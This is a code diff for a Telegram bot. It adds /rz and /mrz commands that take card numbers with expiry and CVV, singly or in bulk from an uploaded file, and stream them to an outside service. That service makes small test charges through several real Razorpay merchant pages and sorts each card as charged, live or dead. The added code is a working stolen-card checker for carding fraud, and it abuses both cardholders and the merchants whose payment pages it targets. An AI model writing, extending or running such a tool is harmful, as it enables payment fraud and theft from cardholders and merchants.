@@ -1001,15 +1001,15 @@ from collections import deque
 # CONFIG
 # =========================
 
-WORKERS = 120
+WORKERS = 7
 
-BATCH_SIZE = 10
+BATCH_SIZE = 5
 
 MAX_RETRIES = 2
 
-TIMEOUT = 15
+TIMEOUT = 30
 
-EDIT_EVERY = 50
+EDIT_EVERY = 30
 
 # =========================
 # GLOBAL SESSION
@@ -3196,6 +3196,228 @@ async def check_single_proxy(event):
 
     except Exception as e:
         await status_msg.edit(premium_emoji(f"❌ Error checking proxy: {e}"), parse_mode=html)
+
+
+
+
+RZ_API = 'https://autoshopify-production-e4f6.up.railway.app'
+
+RZ_SITE = random.choice(['https://razorpay.me/@holidaymoodsadventure', 'https://razorpay.me/@instituteoftechnicalandscient', 'https://razorpay.me/@Advance-BIM', 'https://razorpay.me/@iropay', 'https://razorpay.me/@bafel'])
+
+async def handle_rz_stream(
+    event,
+    progress_msg,
+    cards
+):
+
+    payload = {
+        "cards": cards,
+        "site_url": RZ_SITE,
+        "amount": 1,
+        "save_results": True
+    }
+
+    charged = []
+    live = []
+    dead = []
+
+    checked = 0
+
+    connector = aiohttp.TCPConnector(
+        limit=0,
+        ssl=False
+    )
+
+    timeout = aiohttp.ClientTimeout(
+        total=None
+    )
+
+    async with aiohttp.ClientSession(
+        connector=connector,
+        timeout=timeout
+    ) as session:
+
+        async with session.post(
+                f"{RZ_API}/rz/stream",
+                json=payload
+            ) as resp:
+
+                async for raw_line in resp.content:
+
+                    line = (
+                        raw_line
+                        .decode()
+                        .strip()
+                    )
+
+                    if not line.startswith("data: "):
+                        continue
+
+                    try:
+
+                        data = json.loads(
+                            line[6:]
+                        )
+
+                    except:
+                        continue
+
+                    event_type = data.get("type")
+
+                    # START
+                    if event_type == "start":
+
+                        total = data.get("total")
+
+                    # RESULT
+                    elif event_type == "result":
+
+                        checked += 1
+
+                        status = data.get(
+                            "status",
+                            ""
+                        )
+
+                        card = data.get(
+                            "card",
+                            ""
+                        )
+
+                        if status == "CHARGED":
+
+                            charged.append(card)
+
+                        elif status == "LIVE":
+
+                            live.append(card)
+
+                        else:
+
+                            dead.append(card)
+
+                        # THROTTLED UI
+                        if (
+                            checked % 5 == 0
+                            or checked == len(cards)
+                        ):
+
+                            try:
+
+                                await progress_msg.edit(
+                                    f"""
+    ⚡ <b>RZ STREAM</b>
+
+    📦 Total: {len(cards)}
+    ⏳ Checked: {checked}
+
+    ✅ Charged: {len(charged)}
+    🔥 Live: {len(live)}
+    ❌ Dead: {len(dead)}
+    """,
+                                    parse_mode='html'
+                                )
+
+                            except:
+                                pass
+
+                    # COMPLETE
+                    elif event_type == "complete":
+
+                        await progress_msg.edit(
+                            f"""
+    ✅ <b>RZ COMPLETE</b>
+
+    📦 Total: {data.get('total')}
+    ✅ Charged: {data.get('charged')}
+    🔥 Live: {data.get('live')}
+    """,
+                            parse_mode='html'
+                        )
+
+                        break
+
+                    # ERRORS
+                    elif event_type in [
+                        "fatal",
+                        "fatal_error"
+                    ]:
+
+                        await progress_msg.edit(
+                            f"❌ {data.get('error')}"
+                        )
+
+                        break
+
+                
+@bot.on(events.NewMessage(pattern=r'^/rz(?:@[\w_]+)?(?:\s|$)'))
+async def rz(event):
+
+    try:
+
+        card = (
+            event.raw_text
+            .split(" ", 1)[1]
+            .strip()
+        )
+
+    except:
+
+        await event.reply(premium_emoji("❌ Usage: <code>/rz cc|mm|yy|cvv</code>"), parse_mode=html)
+        return
+
+    progress = await event.reply(
+        "⚡ Starting RZ stream..."
+    )
+
+    asyncio.create_task(
+        handle_rz_stream(
+            event,
+            progress,
+            [card]
+        )
+    )
+
+
+
+
+@bot.on(events.NewMessage(pattern=r'^/mrz(?:@[\w_]+)?(?:\s|$)'))
+async def mrz(event):
+
+    user_id = event.sender_id
+
+    if not KILLER_ALLOWED_USERS(user_id):
+
+        await event.reply(premium_emoji("❌ Usage: <code>You Dont Have Access</code>"), parse_mode=html)
+        return
+
+    if not event.reply_to_msg_id:
+        await event.reply(premium_emoji("❌ Usage: <code>Reply /mrz to a text file</code>"), parse_mode=html)
+        return
+
+    reply = await event.get_reply_message()
+
+    path = await reply.download_media()
+
+    with open(path, 'r') as f:
+        content = f.read()
+
+    cards = extract_cc(content)
+
+    progress = await event.reply(
+        f"⚡ Starting stream for {len(cards)} cards..."
+    )
+
+    asyncio.create_task(
+        handle_rz_stream(
+            event,
+            progress,
+            cards
+        )
+    )
+
+
+
 
 @bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
 async def remove_single_proxy(event):
